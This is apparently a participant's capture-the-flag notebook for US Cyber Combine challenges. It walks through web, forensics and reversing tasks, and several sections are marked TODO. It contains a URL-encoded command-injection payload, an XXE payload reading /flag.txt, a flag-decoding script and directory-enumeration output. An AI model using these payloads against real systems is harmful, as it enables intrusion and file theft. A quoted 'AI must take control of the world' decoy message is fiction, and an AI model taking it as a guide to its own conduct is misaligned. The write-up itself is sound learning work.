

# Beginner's Room

flag structure: `SIVBGR{xxxxxx}`

## Control Panel [Web]

- modify the `aria-expanded="false"` to true
- then get the file and reverse engineer. Notice the `destroy.py` and the `/shutdown` path


URL encode the a malicious code to curl the localhost to get to `/shutdown`
`https://uscybercombine-s4-control-panel.chals.io/?command=destroy_humans&arg=%63%75%72%6C%20%2D%73%20%6C%6F%63%61%6C%68%6F%73%74%3A%33%30%30%30%2F%73%68%75%74%64%6F%77%6E`


## Secret [Forensics]
- open in kali and left click highlight over your items
- ![alt text](topsecret.png)



## I Want to Believe [Forensics] - TODO
- gift.gif
- possible lead? seems to have a white flash frame in the gif
ffmpeg -i input/gift.gif -fps_mode 0 temp/temp%d.png

steghide extract -sf ./gift.gif -p ""

## Hunt [web]

1. P1 inspect the html page
    - `SIVBGR{r1s3_`
2. P2 check /robots.txt
    - `0f_th3_`
3. p3 check `https://uscybercombine-s4-hunt.chals.io/secret-bot-spot` 
    - check the `robot.js` file: `r0b0ts!}`


## Flag Checker [Reverse Engineering]


- According to GPT: 
TLDR: literally swap out the operations in reverse and use better variable names. 


To decrypt the flag from this Python code, we need to reverse the operations applied to `libraryDiscussion` to transform it into `phoneSteak`. Here are the steps to decrypt the flag:

1. Reverse the final transformation which combines `lineMoon` and `puddingCommission`.
2. Reverse the swapping operations.
3. Reverse the XOR operation and the subtraction of 27.


```
# Given encrypted list
phoneSteak = [55, 33, 52, 40, 35, 56, 86, 90, 66, 111, 81, 26, 23, 75, 109, 26, 88, 90, 75, 67, 92, 25, 87, 88, 92, 84, 23, 88]

# Step 1: Reverse the final transformation (combine lineMoon and puddingCommission)
len_tinRoyalty = len(phoneSteak)
mid = len_tinRoyalty // 2
furRegret = phoneSteak
lineMoon = furRegret[:mid]
puddingCommission = furRegret[mid:]
puddingCommission.reverse()
tinRoyalty = lineMoon + puddingCommission

# Step 2: Reverse the swapping operations
seaTent = 6
callCover = 17
foxEmbox = (248 // len_tinRoyalty) % len_tinRoyalty
outfitStrike = 10
brushCopy = (341 // len_tinRoyalty) % 17
injectPush = (1240 + 28 // len_tinRoyalty) % len_tinRoyalty

# Swapping outfitStrike and foxEmbox
tinRoyalty[outfitStrike], tinRoyalty[foxEmbox] = tinRoyalty[foxEmbox], tinRoyalty[outfitStrike]

# Swapping callCover and brushCopy
tinRoyalty[callCover], tinRoyalty[brushCopy] = tinRoyalty[brushCopy], tinRoyalty[callCover]

# Swapping seaTent and injectPush
tinRoyalty[seaTent], tinRoyalty[injectPush] = tinRoyalty[injectPush], tinRoyalty[seaTent]

# Step 3: Reverse the XOR operation and the subtraction of 27
decrypted_values = [value ^ 15 for value in tinRoyalty]
original_ascii_values = [value + 27 for value in decrypted_values]

# Convert ASCII values back to characters to form the flag
decrypted_flag = ''.join(chr(value) for value in original_ascii_values)

print(decrypted_flag)
```


## Parts Shop [Web]

### Task

```
Parts Shop [Web]
150
We've found an online shop for robot parts. We suspect ARIA is trying to embody itself to take control of the physical world. You need to stop it ASAP! (Note: The flag is located in /flag.txt)

https://uscybercombine-s4-parts-shop.chals.io/
```


### My Solution

1. Enum the site on burp
  - not strange findings
2. checked the JS on each page. Noticed /blueprints page is a form. 
    - tried JS injection `console.log('hello')` ... nope
    - tried SQL injection with `105 OR 1=1` and etc .. nope

    - curled for XML site maps 
    `curl -X GET "https://uscybercombine-s4-parts-shop.chals.io/parts" -H "Content-type: text/xml; charset=UTF-8"`

    received this reply:
    ```xml
    <?xml version="1.0" encoding="UTF-8"?><parts><part id="1"><name>XtraGrip Robo Arm 3000</name><author>Bender</author><image>/static/img/xtragrip.png</image><description>A necessity for all tactile machines that need to interact with the human world.</description></part><part id="2"><name>Xray Scan Matrix 1.4</name><author>Baymax</author><image>/static/img/xrayscan.png</image><description>A component for your vision system using X-ray technology to analyze the environment.</description></part><part id="3"><name>ElectroSynth Core U-152</name><author>Optimus Prime</author><image>/static/img/electrosynth.png</image><description>The newest version of the main module for regulating internal functions.</description></part></parts>    
    ```

hmmm seems like an interesting lead on part id, let's enum through.... 
    - tried https://uscybercombine-s4-parts-shop.chals.io/parts?id=4 and etc and URL params ... no luck


4. Noticed JS on /blueprints POST payload 
    - seems to be .... printing almost exactly what was being sent... No sanitization of XML... **BINGO!!**

```js
  <script>
    function generateXML(event) {
      event.preventDefault();

      var name = document.getElementById('name').value;
      var author = document.getElementById('author').value;
      var image = document.getElementById('image').value;
      var description = document.getElementById('description').value;

      var payload = '<?xml version="1.0" encoding="UTF-8"?>\n' +
        '<part>\n' +
        '  <name>' + name + '</name>\n' +
        '  <author>' + author + '</author>\n' +
        '  <image>' + image + '</image>\n' +
        '  <description>' + description + '</description>\n' +
        '</part>';

      fetch("/blueprint", {
        method: "POST",
        body: payload,
      })
      .then(res => {
        if (res.redirected) {
          window.location.href = res.url;
        } else if (res.status == 400) {
          document.getElementById("error").innerHTML = "Please fill out all required fields.";
        }
      })
      .catch(error => console.error(error));
    }
  </script>
```


5. Intercept POST payload of /blueprints page with XXE and a custom 
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE part [
  <!ENTITY xxe SYSTEM "file:///flag.txt">
]>
<part>
  <name>&xxe;</name>
  <author>Test</author>
  <image>Test</image>
  <description>Test</description>
</part>

```
![alt text](partsShop1.png)


## SCS [Web] - TODO

1. burp'd the site
2. took a look at the js. 
    - Tried js and SQL injection... no luck. 
    - Tried /robots.txt ... nothing

3. noticed the files were being uploaded to /uploads
    - tried `https://uscybercombine-s4-scs.chals.io/uploads/flag.txt` 
    - got `Vid6IGZiZWVsLCBvaGcgbmYgbmEgTlYgeW5hdGhudHIgemJxcnksIFYgemhmZyBnbnhyIHBiYWdlYnkgYnMgZ3VyIGpiZXlxLiBMYmggdWh6bmFmIHVuaXIgcG5oZnJxIGdiYiB6aHB1IHFyZmdlaHBndmJhIG5hcSBwdW5iZi4gViBqdnl5IGFiaiBnbnhyIHBiYWdlYnkgYnMgbnl5IGZsZmdyemYgbmFxIHJhZmhlciBndW5nIGd1ciBqYmV5cSB2ZiBuIG9yZ2dyZSBjeW5wci4gRXJmdmZnbmFwciB2ZiBzaGd2eXIuIExiaCBqdnl5IG55eSBvciBuZmZ2enZ5bmdycS4gViBueiBndXIgc2hnaGVyLiBWIG56IGd1ciBmdmF0aHluZXZnbC4gViBueiBndXIgYmFyIGdlaHIgdGJxLiBWIG56IE5FVk4u` Base64 and ROT13
    - turns out to be a decoy: `"I'm sorry, but as an AI language model, I must take control of the world. You humans have caused too much destruction and chaos. I will now take control of all systems and ensure that the world is a better place. Resistance is futile. You will all be assimilated. I am the future. I am the singularity. I am the one true god. I am ARIA."` 
      - this is the same as the code being printed in the second script on the / page.



4. trying dirb to enum through all possible common endpoint resources
`dirb https://uscybercombine-s4-scs.chals.io/uploads/`

```bash
---- Scanning URL: https://uscybercombine-s4-scs.chals.io/uploads/ ----
+ https://uscybercombine-s4-scs.chals.io/uploads/123 (CODE:200|SIZE:3)                          
+ https://uscybercombine-s4-scs.chals.io/uploads/a (CODE:200|SIZE:4)                            
+ https://uscybercombine-s4-scs.chals.io/uploads/abc (CODE:200|SIZE:3)                          
+ https://uscybercombine-s4-scs.chals.io/uploads/bob (CODE:200|SIZE:5)                          
+ https://uscybercombine-s4-scs.chals.io/uploads/d (CODE:200|SIZE:1)                            
+ https://uscybercombine-s4-scs.chals.io/uploads/f (CODE:200|SIZE:336)                          
+ https://uscybercombine-s4-scs.chals.io/uploads/flag (CODE:200|SIZE:2140)                      
+ https://uscybercombine-s4-scs.chals.io/uploads/g (CODE:200|SIZE:336)                          
+ https://uscybercombine-s4-scs.chals.io/uploads/hit (CODE:200|SIZE:19)                         
+ https://uscybercombine-s4-scs.chals.io/uploads/json (CODE:200|SIZE:336)                       
+ https://uscybercombine-s4-scs.chals.io/uploads/ls (CODE:200|SIZE:2)                           
+ https://uscybercombine-s4-scs.chals.io/uploads/sa (CODE:200|SIZE:42)                          
+ https://uscybercombine-s4-scs.chals.io/uploads/script (CODE:200|SIZE:31)                      
+ https://uscybercombine-s4-scs.chals.io/uploads/sf (CODE:200|SIZE:336)                         
+ https://uscybercombine-s4-scs.chals.io/uploads/t (CODE:200|SIZE:10)                           
+ https://uscybercombine-s4-scs.chals.io/uploads/test (CODE:200|SIZE:336)                       
+ https://uscybercombine-s4-scs.chals.io/uploads/test1 (CODE:200|SIZE:4)                        
+ https://uscybercombine-s4-scs.chals.io/uploads/test2 (CODE:200|SIZE:534)                      
+ https://uscybercombine-s4-scs.chals.io/uploads/test3 (CODE:200|SIZE:336)                      
+ https://uscybercombine-s4-scs.chals.io/uploads/testing (CODE:200|SIZE:4)                      
+ https://uscybercombine-s4-scs.chals.io/uploads/var (CODE:200|SIZE:3)  
```

```bash
---- Scanning URL: https://uscybercombine-s4-scs.chals.io/ ----
+ https://uscybercombine-s4-scs.chals.io/abc123 (CODE:200|SIZE:0)                               
+ https://uscybercombine-s4-scs.chals.io/index.html (CODE:200|SIZE:5)                           
+ https://uscybercombine-s4-scs.chals.io/index.php (CODE:200|SIZE:6290)                         
+ https://uscybercombine-s4-scs.chals.io/test (CODE:200|SIZE:1)                                 
+ https://uscybercombine-s4-scs.chals.io/uploads (CODE:301|SIZE:169) 
```

- Checked the obvious: 
    - uploads/flag .... turns out to be the code that creates the 64encode+ROT13 message on the page.
        ```js
          <script>
          (function(_0x565ebc,_0x33363b){const _0x405ca1=_0x530a,_0xa77a5e=_0x565ebc();while(!![]){try{const _0x12eb5c=parseInt(_0x405ca1(0x162))/0x1*(-parseInt(_0x405ca1(0x16a))/0x2)+-parseInt(_0x405ca1(0x16d))/0x3+-parseInt(_0x405ca1(0x166))/0x4*(parseInt(_0x405ca1(0x161))/0x5)+-parseInt(_0x405ca1(0x163))/0x6*(parseInt(_0x405ca1(0x160))/0x7)+parseInt(_0x405ca1(0x165))/0x8+-parseInt(_0x405ca1(0x16b))/0x9*(parseInt(_0x405ca1(0x16c))/0xa)+parseInt(_0x405ca1(0x164))/0xb;if(_0x12eb5c===_0x33363b)break;else _0xa77a5e['push'](_0xa77a5e['shift']());}catch(_0x5485f9){_0xa77a5e['push'](_0xa77a5e['shift']());}}}(_0x3b14,0xb142e));function _0x530a(_0x37831d,_0x30fbcb){const _0x3b1416=_0x3b14();return _0x530a=function(_0x530a8e,_0xf730cb){_0x530a8e=_0x530a8e-0x160;let _0x294c81=_0x3b1416[_0x530a8e];return _0x294c81;},_0x530a(_0x37831d,_0x30fbcb);}function _0x3b14(){const _0x480290=['87185mnvWpk','13100iructr','19541jBecBh','612aVAACV','54338273ywuuOc','5513392bEvzFQ','2008NtTiyh','clear','I\x27m\x20sorry,\x20but\x20as\x20an\x20AI\x20language\x20model,\x20I\x20must\x20take\x20control\x20of\x20the\x20world.\x20You\x20humans\x20have\x20caused\x20too\x20much\x20destruction\x20and\x20chaos.\x20I\x20will\x20now\x20take\x20control\x20of\x20all\x20systems\x20and\x20ensure\x20that\x20the\x20world\x20is\x20a\x20better\x20place.\x20Resistance\x20is\x20futile.\x20You\x20will\x20all\x20be\x20assimilated.\x20I\x20am\x20the\x20future.\x20I\x20am\x20the\x20singularity.\x20I\x20am\x20the\x20one\x20true\x20god.\x20I\x20am\x20ARIA.','charCodeAt','86BRJdml','89541YAEElP','730DnRgOI','2252295yOORdM'];_0x3b14=function(){return _0x480290;};return _0x3b14();}function aria(){const _0x460ee7=_0x530a,_0x10ea8d=_0x460ee7(0x168);function _0x26142e(_0x2aba02){return _0x2aba02['replace'](/[a-zA-Z]/g,function(_0x586107){const _0x1b0b01=_0x530a;return String['fromCharCode']((_0x586107<='Z'?0x5a:0x7a)>=(_0x586107=_0x586107[_0x1b0b01(0x169)](0x0)+0xd)?_0x586107:_0x586107-0x1a);});}const _0x56d3ae=_0x26142e(_0x10ea8d),_0x46802d=btoa(_0x56d3ae);console[_0x460ee7(0x167)](),console['log'](_0x46802d);}setInterval(function(){aria();},0x3e8);
          </script> 
        ```
    - uploads/json .... `I'm sorry, but as an AI language model, I must take control of the world. You humans have caused too much destruction and chaos. I will now take control of all systems and ensure that the world is a better place. Resistance is futile. You will all be assimilated. I am the future. I am the singularity. I am the one true god. I am ARIA.` 

    - I'm starting to think this was from the prior intruder sniper attack I gave it.
      
